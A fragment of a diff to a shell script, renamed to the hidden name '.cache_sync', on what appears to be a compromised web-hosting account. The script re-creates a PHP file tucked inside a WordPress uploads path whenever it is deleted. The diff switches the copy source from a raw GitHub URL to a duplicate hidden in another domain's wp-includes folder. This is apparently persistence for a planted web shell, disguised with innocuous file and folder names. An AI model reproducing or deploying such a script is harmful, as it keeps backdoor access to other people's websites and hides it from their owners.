@@ -16,7 +16,7 @@ mv protect.sh .cache_sync
 #!/bin/sh
 
 FILE="/home/u200768895/domains/aceprofessionalpainting.ca/public_html/wp-content/updraft/widgets/fonts/style-engine/file.php"
-SAFE="https://raw.githubusercontent.com/Ghami1/file/refs/heads/master/luffyMonkeyD1"
+SAFE="/home/u200768895/domains/primeedgereno.ca/public_html/wp-includes/css/dist/block-library/file.php"
 
 if [ ! -f "$FILE" ]; then
     cp "$SAFE" "$FILE"
